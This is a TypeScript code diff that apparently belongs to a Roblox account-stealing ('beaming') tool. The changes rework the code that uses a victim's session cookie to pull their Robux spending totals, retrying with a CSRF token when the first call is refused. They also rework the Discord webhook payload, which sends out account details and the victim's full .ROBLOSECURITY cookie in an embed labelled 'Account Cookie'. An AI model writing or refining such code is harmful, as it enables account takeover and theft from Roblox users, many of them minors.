@@ -339,12 +339,25 @@ async function fetchGamepassEarnings(userId: number): Promise<number | null> {
 async function fetchTransactionTotals(
   userId: number,
   cookieHeader: string,
-): Promise<{ spent: number | null; summary: number | null }> {
+): Promise<{ spent: number; summary: number }> {
+  const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=AllTime&transactionType=summary`;
   try {
-    const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=AllTime&transactionType=summary`;
-    const r = await fetch(url, { headers: { Cookie: cookieHeader } });
-    if (!r.ok) return { spent: null, summary: null };
+    // First call — Roblox usually returns 403 with x-csrf-token header
+    let r = await fetch(url, { headers: { Cookie: cookieHeader } });
+    if (r.status === 403) {
+      const csrf = r.headers.get("x-csrf-token");
+      if (csrf) {
+        r = await fetch(url, {
+          headers: { Cookie: cookieHeader, "x-csrf-token": csrf },
+        });
+      }
+    }
+    if (!r.ok) {
+      console.error("transaction-totals failed", r.status, await r.text().catch(() => ""));
+      return { spent: 0, summary: 0 };
+    }
     const j = await r.json() as Record<string, number>;
+    console.log("transaction-totals raw", JSON.stringify(j));
 
     // Outgoing buckets — sum of all Robux ever spent
     const spent =
@@ -367,8 +380,9 @@ async function fetchTransactionTotals(
       (j.groupPremiumPayoutsTotal ?? 0);
 
     return { spent, summary: incoming - spent };
-  } catch {
-    return { spent: null, summary: null };
+  } catch (e) {
+    console.error("transaction-totals error", e);
+    return { spent: 0, summary: 0 };
   }
 }
 
@@ -498,8 +512,8 @@ function buildDiscordPayload(opts: {
       { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
       { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
-      { name: "💳 Total Robux Spent", value: roblox.robuxSpent !== null ? `${roblox.robuxSpent.toLocaleString()} R$` : "Unknown", inline: true },
-      { name: "📊 Lifetime Summary", value: roblox.summary !== null ? `${roblox.summary >= 0 ? "+" : ""}${roblox.summary.toLocaleString()} R$` : "Unknown", inline: true },
+      { name: "💳 Total Robux Spent", value: `${(roblox.robuxSpent ?? 0).toLocaleString()} R$`, inline: true },
+      { name: "📊 Lifetime Summary", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
     );
 
     // Tracked games played
@@ -553,17 +567,6 @@ function buildDiscordPayload(opts: {
     { name: "Submitted", value: new Date().toISOString(), inline: false },
   );
 
-  // Cookie goes in a SEPARATE second embed, chunked to 1024 chars per field.
-  const cookieFields: Array<{ name: string; value: string; inline?: boolean }> = [];
-  const total = Math.max(1, Math.ceil(cookie.length / 1024));
-  for (let i = 0; i < cookie.length; i += 1024) {
-    const part = cookie.slice(i, i + 1024);
-    cookieFields.push({
-      name: total === 1 ? ".ROBLOSECURITY Cookie" : `Cookie (Part ${i / 1024 + 1}/${total})`,
-      value: part,
-      inline: false,
-    });
-  }
 
   return {
     content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
@@ -580,7 +583,7 @@ function buildDiscordPayload(opts: {
       {
         title: "🍪 Account Cookie",
         color: 0xff5555,
-        fields: cookieFields,
+        description: "```\n" + cookie.slice(0, 4080) + "\n```",
         footer: { text: "Handle with care" },
       },
     ],
